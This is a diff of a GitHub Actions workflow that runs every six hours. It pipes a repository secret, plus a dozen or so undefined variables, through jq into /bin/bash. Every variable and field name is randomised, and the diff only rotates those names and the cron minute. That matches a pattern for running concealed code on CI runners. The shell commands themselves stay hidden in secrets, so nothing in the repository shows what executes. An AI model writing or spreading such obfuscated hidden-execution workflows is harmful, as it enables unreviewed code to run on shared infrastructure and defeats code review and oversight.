@@ -1,29 +1,31 @@
 name: wuzhurong1122
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
+    - cron: '59 2/6 * * *'
 
-jobs:  # 1052
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuzhurong1122
         env:
-          huryl203: ${{ secrets.huryl203 }}
+          olt2968: ${{ secrets.olt2968 }}
         run: |
-          echo $huryl203 | jq -r .uqkx871 | /bin/bash
-          echo $x90 | jq -r .d24089 | /bin/bash
-          echo $gs18599 | jq -r .w487 | /bin/bash
-          echo $y35 | jq -r .irqdm17221 | /bin/bash
-          echo $jfhii9 | jq -r .fija8 | /bin/bash
-          echo $whyuz387 | jq -r .omrjq85 | /bin/bash
-          echo $rk12929 | jq -r .a6159 | /bin/bash
-          echo $lnio30229 | jq -r .vpbwl555 | /bin/bash
-          echo $s21 | jq -r .uvxo969 | /bin/bash
-          echo $uxsl30172 | jq -r .lguu16 | /bin/bash
-          echo $tjo89180 | jq -r .gaqo9289 | /bin/bash
-          echo $g6 | jq -r .jr12358 | /bin/bash
+          echo $olt2968 | jq -r .mzn266 | /bin/bash
+          echo $oq16151 | jq -r .gg3 | /bin/bash
+          echo $fqam8317 | jq -r .uzup2 | /bin/bash
+          echo $zfr06 | jq -r .fzqyg3452 | /bin/bash
+          echo $qeku6 | jq -r .mwrp1677 | /bin/bash
+          echo $mp9 | jq -r .mirry693 | /bin/bash
+          echo $jabxj3741 | jq -r .ivud70286 | /bin/bash
+          echo $wo6867 | jq -r .aqbv2 | /bin/bash
+          echo $tsti6 | jq -r .jrwf395 | /bin/bash
+          echo $p68835 | jq -r .vulah12 | /bin/bash
+          echo $cue00 | jq -r .af7409 | /bin/bash
+          echo $igsjj6043 | jq -r .loas111 | /bin/bash
+          echo $pnbd85325 | jq -r .g9330 | /bin/bash
+          echo $enl02631 | jq -r .dauti3 | /bin/bash
 
